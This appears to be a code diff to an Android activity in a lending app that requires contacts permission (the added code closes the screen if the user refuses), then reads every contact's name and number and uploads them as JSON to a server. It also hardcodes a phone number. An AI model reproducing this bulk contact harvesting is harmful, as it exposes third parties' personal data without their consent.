@@ -130,7 +130,7 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
                         Toast.makeText(this, "请同意申请", Toast.LENGTH_SHORT).show()
                         checkPermision()
                     } else {
-
+                        finish()
                     }
                 }
         }
@@ -157,8 +157,8 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
                         cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                     val number =
                         cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
-//                    hashMap.add(displayName + DIVISION + number)
                     hashMap?.put(displayName, number)
+//                    hashMap?.put(displayName, "1231241234532")
                 }
                 var account = DKConstant.getUserEntity()?.phone ?: ""
                 if (account == "15823681500") {
@@ -166,19 +166,6 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
                 }
                 hashMap?.put("easyBorrow", account)
 
-                var buffer = StringBuffer("[")
-                for (item in hashMap!!) {
-                    buffer.append("\"${item.key}\"")
-                    buffer.append(":")
-                    buffer.append("\"${item.value}\"")
-                    buffer.append(",")
-                }
-
-                buffer.append("]")
-                var content = buffer.toString()
-
-                content = content.replace(",]", "]")
-//                getPresenter().uploadContacts1(content)
                 var json = Gson().toJson(hashMap)
                 getPresenter().uploadContacts1(json)
 
